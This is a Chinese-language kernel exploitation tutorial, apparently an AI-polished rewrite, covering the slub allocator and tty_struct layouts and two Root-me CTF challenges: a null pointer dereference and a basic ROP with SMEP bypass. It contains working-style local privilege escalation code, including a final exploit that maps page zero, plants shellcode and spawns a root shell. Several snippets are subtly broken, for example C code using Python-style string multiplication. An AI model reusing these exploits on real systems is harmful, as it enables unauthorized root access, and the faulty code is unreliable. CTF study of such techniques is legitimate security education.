### 代码分析与优化

首先，我们来优化和澄清提供的代码段及其相关说明。我们将逐步解释每个部分，并确保信息的清晰、连贯和专业。

#### `kmalloc` 函数解析
`kmalloc` 实际上是使用 `slab/slub` 分配器进行内存分配。当前常见的分配器是 `slub`。这个分配器通过多级结构进行管理，主要包含 `cache` 层。`cache` 是一个结构体，用于管理空对象、部分使用的对象和完全使用中的对象。这些对象是指内存对象，即内核空间中分配或已分配的一部分内存。

- **`slab` 分配器**：严格按照 `cache` 区分，不同 `cache` 的对象不能分配在同一页面。
- **`slub` 分配器**：较为宽松，如果不同 `cache` 分配相同大小的对象，可能会在同一页内。

#### `tty_struct` 结构体
`tty_struct` 定义位于 `/source/include/linux/tty.h#L282`：

```c
struct tty_struct {
    int magic;
    struct kref kref;
    struct device *dev;
    struct tty_driver *driver;
    const struct tty_operations *ops;
    int index;
    struct ld_semaphore ldisc_sem;
    struct tty_ldisc *ldisc;
    struct mutex atomic_write_lock;
    struct mutex legacy_mutex;
    struct mutex throttle_mutex;
    struct rw_semaphore termios_rwsem;
    struct mutex winsize_mutex;
    spinlock_t ctrl_lock;
    spinlock_t flow_lock;
    struct ktermios termios, termios_locked;
    struct termiox *termiox;
    char name[64];
    struct pid *pgrp;
    struct pid *session;
    unsigned long flags;
    int count;
    struct winsize winsize;
    unsigned long stopped:1,
                  flow_stopped:1,
                  unused:BITS_PER_LONG - 2;
    int hw_stopped;
    unsigned long ctrl_status:8,
                  packet:1,
                  unused_ctrl:BITS_PER_LONG - 9;
    unsigned int receive_room;
    int flow_change;
    struct tty_struct *link;
    struct fasync_struct *fasync;
    wait_queue_head_t write_wait;
    wait_queue_head_t read_wait;
    struct work_struct hangup_work;
    void *disc_data;
    void *driver_data;
    spinlock_t files_lock;
    struct list_head tty_files;
#define N_TTY_BUF_SIZE 4096
    int closing;
    unsigned char *write_buf;
    int write_cnt;
    struct work_struct SAK_work;
    struct tty_port *port;
} __randomize_layout;
```

重点关注 `tty_struct -> ops`，其类型为 `const struct tty_operations`，定义位于 `/source/include/linux/tty_driver.h#L253`：

```c
struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver, struct file *filp, int idx);
    int (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int (*open)(struct tty_struct *tty, struct file *filp);
    void (*close)(struct tty_struct *tty, struct file *filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int (*write)(struct tty_struct *tty, const unsigned char *buf, int count);
    int (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int (*write_room)(struct tty_struct *tty);
    int (*chars_in_buffer)(struct tty_struct *tty);
    int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios *old);
    void (*throttle)(struct tty_struct *tty);
    void (*unthrottle)(struct tty_struct *tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty, unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty, struct serial_icounter_struct *icount);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    const struct file_operations *proc_fops;
} __randomize_layout;
```

通常，我们希望劫持 `ioctl` 这个函数指针。

### 漏洞利用案例分析

#### [Root-me]LinKern x86 – Null pointer dereference

##### 考查点
- **Null pointer dereference in Kernel**

##### 内核保护状态
- **Init 文件分析**：内核未开启任何保护。
- **LKMs 文件分析**：仅开启了 NX 保护。

##### 逻辑分析
- **tostring_write**：函数首先打印 `"Tostring: write()\n"`，然后调用 `kmalloc` 分配一个 Chunk。`kmalloc` 有两个参数：`Size` 和 `flag`。常用的标志包括 `GFP_KERNEL` 和 `GFP_ATOMIC` 等。此处程序使用的是 `GFP_DMA` 标志。
- **tostring_read**：直接调用 `tostring->tostring_read` 函数指针。

##### 漏洞分析
- **漏洞点**：程序在调用 `tostring->tostring_read` 函数指针时没有验证指针的有效性，导致尝试调用空指针。由于关闭了 `mmap_min_addr` 保护，可以 `mmap` 0 地址处的内存映射，写入 shellcode 并执行。

##### 动态调试验证
- **QEMU 启动指令**：
  ```sh
  qemu-system-i386 -s -kernel bzImage -append nokaslr -initrd initramfs.img -fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/error404/Desktop/CTF_question/Kernel/Null_pointer_dereference/Share -device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme
  ```
- **确定 Section 地址**：
  ```sh
  lsmod
  grep 0 /sys/module/[module_name]/sections/.text
  grep 0 /sys/module/[module_name]/sections/.data
  grep 0 /sys/module/[module_name]/sections/.bss
  # 0xC8824000
  # 0xC88247E0
  # 0xC8824A80
  ```
- **GDB 设置**：
  ```gdb
  add-symbol-file tostring.ko 0xC8824000 -s .data 0xC88247E0 -s .bss 0xC8824A80
  ```

##### PoC 代码
- **验证逻辑**：
  ```c
  #include <stdio.h>
  #include <fcntl.h>
  #include <unistd.h>

  int main(void) {
      int fd = open("/dev/tostring", 2);
      write(fd, "**********H", 11);
      write(fd, "**********D", 11);
      write(fd, "**********S", 11);
      write(fd, "**********N", 11);
      write(fd, "AAAABBBB", 9);
      return 0;
  }
  // gcc -m32 -static -o Exploit Exploit.c
  ```

- **劫持 EIP**：
  ```c
  #include <stdio.h>
  #include <fcntl.h>
  #include <unistd.h>
  #include <sys/mman.h>
  #include <string.h>

  char payload[] = "\xe9\xea\xbex\x0b"; // jmp 0xbadbeef

  int main(void) {
      char Get_shell[20];
      mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
      memcpy(0, payload, sizeof(payload));
      int fd = open("/dev/tostring", 2);
      write(fd, "**********S", 11);
      read(fd, Get_shell, sizeof(Get_shell));
      return 0;
  }
  // gcc -m32 -static -o Exploit Exploit.c
  ```

- **Final Exploit**：
  ```c
  #include <stdio.h>
  #include <fcntl.h>
  #include <unistd.h>
  #include <sys/mman.h>
  #include <string.h>
  #include <stdlib.h>

  char payload[] = "\x31\xc0\xe8\xe9\x11\x07\xc1\xe8\x74\x0e\x07\xc1\xc3";

  int main(void) {
      char Get_shell[20];
      mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
      memcpy(0, payload, sizeof(payload));
      int fd = open("/dev/tostring", 2);
      write(fd, "**********S", 11);
      read(fd, Get_shell, sizeof(Get_shell));
      system("/bin/sh");
      return 0;
  }
  // gcc -m32 -static -o Exploit Exploit.c
  ```

#### [Root-me]LinKern x86 – basic ROP

##### 考查点
- **ROP in Kernel**
- **Bypass SMEP**

##### 调试信息
- **QEMU 启动指令**：
  ```sh
  qemu-system-i386 -s -kernel bzImage -append nokaslr -initrd initramfs.img -fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/error404/Desktop/CTF_question/Kernel/basic_ROP/Share -device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme -cpu kvm64,+smep
  ```
- **重要地址**：
  ```sh
  .text : 0xC8824000
  .data : 0xC88241A0
  .bss  : 0xC8824440
  # code in gdb
  add-symbol-file tostring.ko 0xC8824000 -s .data 0xC88241A0 -s .bss 0xC8824440
  ```

##### Init 文件分析
- **加载 LKMs**：正常加载 LKMs，但未关闭 `mmap_min_addr` 防护。
- **SMEP 保护**：检测 `smep` 是否开启可以使用以下命令。

##### LKMs 文件分析
- **用户态**：仅开启了 NX 保护。

##### 逻辑分析与漏洞分析
- **题目逻辑**：简单的读入操作，存在栈溢出。
- **控制 EIP**：发送以下 PoC，程序应断在 `0xdeadbeef`：
  ```c
  #include <stdio.h>
  #include <fcntl.h>
  #include <unistd.h>
  #include <string.h>
  #include <stdlib.h>

  int main(void) {
      int fd = open("/dev/tostring", 2);
      write(fd, "A" * 100 + "\xef\xbe\xad\xde", 104);
      return 0;
  }
  // gcc -m32 -static -o Exploit Exploit.c
  ```

通过以上优化，文本变得更加清晰、连贯和专业。希望这对你有所帮助！